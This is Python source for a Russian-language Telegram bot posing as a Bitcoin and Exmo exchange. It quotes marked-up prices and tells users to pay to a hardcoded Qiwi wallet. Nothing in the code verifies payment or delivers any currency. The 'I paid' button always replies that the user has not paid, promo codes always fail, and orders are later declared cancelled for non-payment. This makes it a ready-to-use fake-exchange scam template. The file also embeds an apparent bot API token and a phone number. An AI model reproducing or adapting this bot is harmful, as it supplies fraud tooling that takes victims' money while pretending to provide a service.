import telebot
from telebot import TeleBot
from telebot import types
import logging
import time
import requests
import re
from array import array
import random
import string
import json
from emoji import emojize
import schedule

dump = 1
logger = telebot.logger


if dump:
	telebot.logger.setLevel(logging.DEBUG)
#Здесь вводишь API-токен из @botFather.
########################################################
token = "925613654:AAF4NxYjQQe00CMhSDL0g7FEIYxGm_qG9dk"#
########################################################
#Здесь вводишь свой киви.
#####################
qiwi = "+79220175088"#
#####################


bot = telebot.TeleBot(token)
order_number = random.randint(1, 9999)

print('BOT STARTED!')




	
@bot.message_handler(commands=['start'])
def welcome_message(message):
	url = "https://api.cryptonator.com/api/ticker/BTC-RUB"
	req = requests.get(url)
	data = req.json()
	global btc_price
	btc_price = float(data['ticker']['price'])
	print("Курс Bitcoin: ", round(btc_price), " рублей")
	markup = types.ReplyKeyboardMarkup(resize_keyboard=True, row_width=1)
	markup.one_time_keyboard =False
	markup.row('Обменять \U0001F4B8')
	markup.row('Реф.программа \U0001F5E3', 'Контакты \U0000260E')
	markup.row('Активировать промокод')
	msg = bot.send_message(message.chat.id, "Добро пожаловать в наш обменник!",reply_markup=markup)
	bot.register_next_step_handler(msg, next)
	
def second_menu(message):
	url = "https://api.cryptonator.com/api/ticker/BTC-RUB"
	req = requests.get(url)
	data = req.json()
	global btc_price
	btc_price = float(data['ticker']['price'])
	print(btc_price)
	markup = types.ReplyKeyboardMarkup(resize_keyboard=True, row_width=1)
	markup.one_time_keyboard =False
	markup.row('Обменять \U0001F4B8')
	markup.row('Реф.программа \U0001F5E3', 'Контакты \U0000260E')
	markup.row('Активировать промокод')
	msg = bot.send_message(message.chat.id, "Продолжить работу",reply_markup=markup)
	bot.register_next_step_handler(msg, next)

	
def next(message):
	if message.text == 'Обменять \U0001F4B8':
		markup = types.ReplyKeyboardMarkup(resize_keyboard=True, row_width=1)
		markup.one_time_keyboard =False
		markup.row('Exmo руб. \U0001F4B0', 'Bitcoin BTC \U0001F4B0')
		markup.row('\U0001F519 Назад')
		msg = bot.send_message(message.chat.id, " \U0001F4F2 Выберите, что хотите купить:", reply_markup=markup)
		bot.register_next_step_handler(msg, buy)
	elif message.text == 'Реф.программа \U0001F5E3':
		bot.send_message(message.chat.id,"Этот раздел в разработке. Скоро будет.")
		second_menu(message)
	elif message.text == 'Контакты \U0000260E':
		bot.send_message(message.chat.id,"Контакты \n @yourname по поводу повода \n @secondname по поводу поводу по поводу? ШО? \n ссилачка канала t.me/jopa")
		second_menu(message)
	elif message.text == 'Активировать промокод':
		msg = bot.send_message(message.chat.id, "Введите промокод:")
		bot.register_next_step_handler(msg, promo)
	
def promo(message):
	bot.send_message(message.chat.id, "Промокод не найден!")
	second_menu(message)


def buy(message):
	if message.text == 'Bitcoin BTC \U0001F4B0':
		markup = types.ReplyKeyboardMarkup(resize_keyboard=True, row_width=1)
		markup.one_time_keyboard =False
		markup.row('\U0001F519 Назад')
		msg = bot.send_message(message.chat.id, "Введите сумму Bitcoin BTC", reply_markup=markup)
		bot.register_next_step_handler(msg, buy_btc)
	elif message.text == 'Exmo руб. \U0001F4B0':
		markup = types.ReplyKeyboardMarkup(resize_keyboard=True, row_width=1)
		markup.one_time_keyboard =False
		markup.row('\U0001F519 Назад')
		msg = bot.send_message(message.chat.id, "Введите сумму Exmo руб.", reply_markup=markup)
		bot.register_next_step_handler(msg, buy_exmo)
	else:
		second_menu(message)
	
def buy_btc(message):
	number = message.text.replace('.','',1).isdigit()
	print(number)
	if message.text == "\U0001F519 Назад":
		second_menu(message)
	elif not number:
		msg = bot.send_message(message.chat.id, "Ошибка! Введите числовое значение:")
		bot.register_next_step_handler(msg, buy_btc)
		return
	elif float(message.text) >= 0.51:
		msg = bot.send_message(message.chat.id, "Максимальное значение 0.5 BTC!")
		bot.register_next_step_handler(msg, buy_btc)
		return
	else:
		global summ 
		summ = float(message.text)
		markup = types.ReplyKeyboardMarkup(resize_keyboard=True, row_width=1)
		markup.one_time_keyboard =False
		markup.row('Согласен','Отмена')
		global total_price
		total_price = float((btc_price * summ)+((btc_price *summ)/8))
		print(total_price)
		msg = bot.send_message(message.chat.id, "Для получения Bitcoin в размере "+str(summ)+" BTC.\n\nВам необходимо оплатить на Qiwi кошелек "+str(round(total_price))+" руб."+"\n\nНажмите СОГЛАСЕН для получения реквизитов", reply_markup=markup)
		bot.register_next_step_handler(msg, ok_button)
	
def buy_exmo(message):
	if message.text == "\U0001F519 Назад":
		second_menu(message)
	elif not message.text.isdigit():
		msg = bot.send_message(message.chat.id, "Ошибка! Введите числовое значение:")
		bot.register_next_step_handler(msg, buy_exmo)
		return
	elif float(message.text) < 499:
		msg = bot.send_message(message.chat.id, "Сумма обмена не может быть меньше 500 руб!")
		bot.register_next_step_handler(msg, buy_exmo)
		return
	elif float(message.text) > 60000:
		msg = bot.send_message(message.chat.id, "Максимальное значение - 60000 руб.\nВведите сумму Exmo руб.!")
		bot.register_next_step_handler(msg, buy_exmo)
	else:
		global summ 
		summ = float(message.text)
		markup = types.ReplyKeyboardMarkup(resize_keyboard=True, row_width=1)
		markup.one_time_keyboard =False
		markup.row('Согласен','Отмена')
		global total_price
		total_price = float((summ + (summ/8)))
		msg = bot.send_message(message.chat.id, "Для получения Exmo в размере "+str(summ)+" руб.\n\nВам необходимо оплатить на Qiwi кошелек "+str(round(total_price))+ " руб.\n\nНажмите СОГЛАСЕН для получения реквизитов", reply_markup=markup)
		bot.register_next_step_handler(msg, exmo_pay)
	
	
def ok_button(message):
	if message.text == 'Согласен':
		markup = types.ReplyKeyboardMarkup(resize_keyboard=True, row_width=1)
		markup.one_time_keyboard =False
		markup.row('\U0001F519 Назад')
		msg = bot.send_message(message.chat.id, "Введите Адрес криптокошелька Bitcoin", reply_markup=markup)
		bot.register_next_step_handler(msg, bitcoin_kosh)
	else:
		second_menu(message)

def exmo_pay(message):
	if message.text == "Отмена":
		second_menu(message)
	else:
		bot.send_message(message.chat.id, " \U00002757 ВНИМАНИЕ \U00002757 После оплаты необходимо сообщить боту об этом, нажав Я оплатил")
		markup = types.InlineKeyboardMarkup()
		i_pay = types.InlineKeyboardButton('Я оплатил!', callback_data='i_pay_btn')
		cancel = types.InlineKeyboardButton('Отменить', callback_data='cancel_btn')
		markup.add(i_pay, cancel)
		bot.send_message(message.chat.id, "Ваша заявка №"+str(order_number)+"\nУ Вас есть 50 минут для оплаты. \n\nQiwi кошелек: "+str(qiwi)+"\nСумма: "+str(round(total_price))+" руб."+"\nКомментарий: "+str(order_number)+"\n"+"ЕСЛИ ЗАКИНУЛИ БЕЗ КОММЕНТАРИЯ, ТО ВЫ ПОДАРИЛИ ДЕНЬГИ!", reply_markup=markup)
		second_menu(message)
		return
		schedule.run_pending()
		time.sleep(3000)
		bot.send_message(message.chat.id, "Обмен №2617"+str(order_number)+" отменен по причине отсутствия своевременной оплаты.")


def bitcoin_kosh(message):
	if message.text == message.text:
		if re.match('[13][a-km-zA-HJ-NP-Z1-9]{25,34}$', message.text):
			bot.send_message(message.chat.id, " \U00002757 ВНИМАНИЕ \U00002757 После оплаты необходимо сообщить боту об этом, нажав Я оплатил")
			markup = types.InlineKeyboardMarkup()
			i_pay = types.InlineKeyboardButton('Я оплатил!', callback_data='i_pay_btn')
			cancel = types.InlineKeyboardButton('Отменить', callback_data='cancel_btn')
			markup.add(i_pay, cancel)
			bot.send_message(message.chat.id, "Ваша заявка №"+str(order_number)+"\nУ Вас есть 50 минут для оплаты. \n\nQiwi кошелек: "+str(qiwi)+"\nСумма: "+str(round(total_price))+" руб."+"\nКомментарий: "+str(order_number)+"\n"+"ЕСЛИ ЗАКИНУЛИ БЕЗ КОММЕНТАРИЯ, ТО ВЫ ПОДАРИЛИ ДЕНЬГИ!", reply_markup=markup)
			schedule.run_pending()
			time.sleep(5)
			second_menu(message)
			schedule.run_pending()
			time.sleep(3000)
			bot.send_message(message.chat.id, "Обмен №2617"+str(order_number)+" отменен по причине отсутствия своевременной оплаты.")
			second_menu(message)
		else:
			bot.send_message(message.chat.id, "Ошибка! Введите правильный адрес криптокошелька Bitcoin")
			second_menu(message)
		
		
		
@bot.callback_query_handler(func=lambda call: True)
def iq_callback(call):
	if call.message:
		if call.data == "i_pay_btn":
			bot.answer_callback_query(callback_query_id=call.id, text="Вы ещё не оплатили!", show_alert=True)
		elif call.data == "cancel_btn":
			bot.edit_message_text(chat_id=call.message.chat.id, message_id=call.message.message_id, text="Заявка отменена.")
	
	
if __name__ == '__main__':
	bot.polling(none_stop=True)
